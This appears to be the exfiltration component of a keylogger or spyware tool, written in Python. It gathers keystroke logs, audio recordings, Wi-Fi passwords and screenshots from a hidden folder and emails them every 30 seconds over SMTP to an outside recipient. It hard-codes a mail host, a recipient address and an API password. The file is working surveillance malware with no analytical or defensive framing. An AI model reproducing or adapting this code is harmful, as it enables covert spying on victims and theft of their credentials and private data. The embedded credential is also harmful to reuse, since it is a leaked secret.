from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
import smtplib
import time
from logger_setup import operation_logger

log_dir = os.path.join(os.path.expanduser("~"), ".hiddenfolder")


def send_email_with_attachments(sender, receiver, folder_path, smtp_server, port, login_user, login_password):

    global operation_logger 
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = receiver
    msg['Subject'] = "System Logs and Audio Notification"

    body = "This is an automated email containing key logs, system logs, audio recording, and Wi-Fi password file."
    msg.attach(MIMEText(body, 'plain'))

    files_to_attach = [
        "keylog.txt",
        "log.txt",
        "audio_rec.wav",
        "wifi_password.txt"
    ]

    for filename in files_to_attach:
        file_path = os.path.join(folder_path, filename)
        if os.path.isfile(file_path):
            try:
                with open(file_path, 'rb') as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename= {filename}')
                msg.attach(part)
                operation_logger.info(f"Successfully attached {filename} to the email.")
            except Exception as e:
                operation_logger.error(f"Error attaching {filename}: {e}")
        else:
            operation_logger.warning(f"{filename} not found in {folder_path}, skipping attachment.")

    for filename in os.listdir(folder_path):
        if filename.startswith("screenshot_") and filename.endswith(".png"):
            file_path = os.path.join(folder_path, filename)
            try:
                with open(file_path, 'rb') as attachment:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename= {filename}')
                msg.attach(part)
                operation_logger.info(f"Successfully attached screenshot {filename} to the email.")
            except Exception as e:
                operation_logger.error(f"Error attaching screenshot {filename}: {e}")

    # connect to SMTP server and send the email
    try:
        with smtplib.SMTP(smtp_server, port) as server:
            server.starttls()
            server.login(login_user, login_password)
            server.sendmail(sender, receiver, msg.as_string())
        operation_logger.info("Email with specified attachments sent successfully!")
    except Exception as e:
        operation_logger.error(f"Failed to send email: {e}")

def email_thread(interval=30):
    
    while True:
        try:
            send_email_with_attachments(
                sender="Private Person <hello@demomailtrap.com>",
                receiver="A Test User <mannatvirk6841@gmail.com>",
                folder_path=log_dir,
                smtp_server="live.smtp.mailtrap.io",
                port=587,
                login_user="api",
                login_password="ad9ae87d8204b728c11a09d7c502d5b3"
            )
        except Exception as e:
            operation_logger.error(f"Error sending email: {e}")
        time.sleep(interval)